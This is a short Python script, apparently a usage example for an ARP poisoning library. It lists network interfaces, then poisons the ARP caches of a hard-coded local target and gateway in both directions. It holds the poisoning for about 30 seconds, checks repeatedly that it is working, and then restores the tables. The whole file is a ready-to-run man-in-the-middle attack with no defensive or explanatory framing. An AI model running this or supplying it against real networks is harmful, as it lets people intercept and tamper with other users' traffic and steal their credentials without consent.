from lib.shared.helpers import check_root
import time
from lib import ARPConfig, ARPPoisoningEngine, list_interfaces


def main():
    print("Interfaces:")
    for iface in list_interfaces():
        marker = " (default)" if iface.is_default else ""
        if not iface.is_usable:
            marker = " (unusable)" + marker
        print(f"  {iface.display_name[:30]:<30} {iface.ipv4:<16} {iface.mac:<18}{marker}")

    config = ARPConfig(
        target_ip="192.168.1.28",
        gateway_ip="192.168.1.1",
        direction="two-way",
    )

    with ARPPoisoningEngine(config) as arp_engine:
        print("Started:", arp_engine)
        time.sleep(30)
        for i in range(10):
            result = arp_engine.verify(timeout=5)
            time.sleep(3)
        
        print(result.detail)

    print("Stopped. ARP tables restored.")


if __name__ == "__main__":
    check_root()
    main()